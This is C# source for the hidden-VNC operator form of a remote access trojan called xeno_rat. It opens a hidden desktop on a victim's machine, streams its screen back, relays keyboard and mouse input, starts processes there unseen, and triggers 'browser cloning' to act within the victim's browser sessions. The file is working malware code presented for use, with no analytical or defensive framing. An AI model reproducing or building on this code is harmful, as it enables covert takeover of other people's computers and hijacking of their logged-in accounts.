using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Hvnc : Form
    {
        private readonly Node client;
        private Node imageNode;
        private const string DesktopName = "hidden_desktop";
        private bool playing = false;
        private bool isCloningBrowser = false;
        private readonly string[] qualitys = { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };

        public Hvnc(Node client)
        {
            this.client = client;
            InitializeComponent();
            InitializeAsync();
        }

        private async Task InitializeAsync()
        {
            imageNode = await CreateImageNode();
            imageNode.AddTempOnDisconnect(TempOnDisconnect);
            client.AddTempOnDisconnect(TempOnDisconnect);
            await client.SendAsync(Encoding.UTF8.GetBytes(DesktopName));
            customPictureBox1 = new CustomPictureBox(client);
            customPictureBox1.SetupPictureBox(pictureBox1);
            Controls.Remove(pictureBox1);
            Controls.Add(customPictureBox1);
            comboBox1.Items.AddRange(qualitys);
            await RecvThread();
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            customPictureBox1.TriggerWndProc(ref msg);
            return true;
        }

        public async Task Start()
        {
            await client.SendAsync(new byte[] { 0 });
        }

        public async Task Stop()
        {
            await client.SendAsync(new byte[] { 1 });
        }

        public async Task SetQuality(int quality)
        {
            await client.SendAsync(client.sock.Concat(new byte[] { 2 }, client.sock.IntToBytes(quality)));
        }

        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == imageNode && imageNode != null))
            {
                client?.Disconnect();
                imageNode?.Disconnect();
                if (!IsDisposed)
                {
                    Invoke((MethodInvoker)(Close));
                }
            }
        }

        public async Task RecvThread()
        {
            while (imageNode.Connected())
            {
                byte[] data = await imageNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    try
                    {
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            Image image = Image.FromStream(ms);
                            customPictureBox1.UpdateImage(image);
                        }
                    }
                    catch { }
                }
            }
        }

        private async Task StartProc(string path)
        {
            if (!playing) return;
            await client.SendAsync(client.sock.Concat(new byte[] { 5 }, Encoding.UTF8.GetBytes(path)));
            await client.SendAsync(new byte[] { 5 });
        }

        private async Task EnableBrowserClone()
        {
            if (!playing || isCloningBrowser) return;
            await client.SendAsync(new byte[] { 6 });
            isCloningBrowser = true;
        }

    }

    public class CustomPictureBox : PictureBox
    {
        private readonly Node client;

        public CustomPictureBox(Node client)
        {
            this.client = client;
        }

        public void SetupPictureBox(PictureBox pictureBox)
        {
            Name = "pictureBox1";
            Size = pictureBox.Size;
            Location = pictureBox.Location;
            Image = pictureBox.Image;
            SizeMode = pictureBox.SizeMode;
            Anchor = pictureBox.Anchor;
        }

        public void TriggerWndProc(ref Message m)
        {
            WndProc(ref m);
        }

        public void UpdateImage(Image image)
        {
            BeginInvoke(new Action(() =>
            {
                if (Image != null)
                {
                    Image.Dispose();
                    Image = null;
                }
                Image = image;
            }));
        }

    }
}
